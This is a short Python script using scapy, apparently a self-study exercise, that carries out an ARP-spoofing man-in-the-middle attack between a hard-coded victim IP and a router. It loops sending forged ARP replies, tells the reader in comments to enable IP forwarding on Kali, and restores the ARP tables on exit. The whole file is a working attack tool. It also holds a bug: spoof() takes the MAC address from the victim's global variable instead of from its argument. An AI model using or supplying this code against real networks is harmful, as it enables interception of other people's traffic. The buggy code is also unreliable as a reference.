#!/usr/bin/env python3
"""
Spoofing our target, being the Man In The Middle
"""

from scapy.layers.l2 import ARP, Ether, srp
from scapy.all import send
from time import sleep


def get_mac(ip):
    """Scanning for all local IP and MAC"""

    # This give us the IP for our target
    arp_request = ARP(pdst=ip)

    # This give us the MAC for our target
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

    # Scapy allow us to combine both layers together
    arp_request_broadcast = broadcast/arp_request

    # This function give us answered and unanswered packets.
    # Verbose = False -> give us less information
    # Timeout -> the time we wait for reaction
    answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """Spoofing our target"""
    # We have a problem here: if every time we get the MAC address we cannot spoof the router
    # We need to do this outside the function
    # Also outside getting all the IP/MAC addresses

    # target_mac = get_mac(target_ip) -> This is not valid !!!
    # hwsrc -> this is the MAC address of KALI: hwsrc="00:0c:29:af:29:90"
    target_mac = get_mac(target_ip_victim)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def reset(target_ip, victim_ip):
    """Restoring the original ARP tables"""
    dest_mac = get_mac(target_ip)
    source_mac = get_mac(victim_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=dest_mac, psrc=victim_ip, hwsrc=source_mac)
    send(packet, verbose=False)


# We could implement entering the IPs with input or with some functions
target_ip_victim = "192.168.0.104"
ip_router = "192.168.0.1"

# We get our mac addr. inside spoof function
# target_mac = get_mac(target_ip_victim)
# target_mac_router = get_mac(ip_router)
send_packets = 0
try:

    while True:
        spoof(target_ip_victim, ip_router)
        spoof(ip_router, target_ip_victim)
        send_packets += 2

        # \r is dynamic replacement of the printing msg
        print(f"\r[+] Send packets: {send_packets}", end="")
        # We need to forward the packet in Kali machine in order the internet to continue
        # With this we make our Kali machine to be a router
        # the code to run in Kali is:  sysctl -w net.ipv4.ip_forward=1
        sleep(1)
except KeyboardInterrupt:
    # reset our target and victim with original ARP table
    reset(target_ip_victim, ip_router)
    reset(ip_router, target_ip_victim)
    print("\nExiting...")



